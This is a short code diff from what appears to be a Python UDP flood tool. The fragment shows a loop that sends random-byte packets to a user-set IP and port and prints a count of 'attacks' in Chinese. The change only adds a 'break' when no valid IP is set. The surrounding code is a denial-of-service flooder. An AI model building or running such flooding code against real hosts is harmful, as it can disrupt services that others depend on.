@@ -89,6 +89,7 @@ class Main(Cmd):
 				so.sendto(randbyte,(self.ip,self.port)) # 发送数据包，格式(socket.sendto(data,(IP,port)))
 			except Exception:
 				print('您没有设置IP地址或者没有正确设置IP地址')
+				break
 			print('这是第',i+1,'攻击!') #输出，让用户知道在攻击
 
 	def true_to_attack_thread(self): # 攻击线程启动与设置部分
